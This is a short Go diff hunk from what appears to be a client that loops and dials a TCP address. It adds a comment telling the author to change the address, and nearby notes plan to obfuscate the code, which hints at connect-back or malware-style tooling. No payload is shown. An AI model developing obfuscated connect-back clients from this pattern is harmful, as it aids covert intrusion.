@@ -16,7 +16,7 @@ func main () {
 		time.Sleep(time.Second)
 		for {
 			// note to self: add obfuscation
-			connection, errer := net.Dial("tcp", "127.0.0.1:80") // obf
+			connection, errer := net.Dial("tcp", "127.0.0.1:80") // obf //CHANGE THIS!!! <---
 			if (errer != nil) {
 				break
 			}
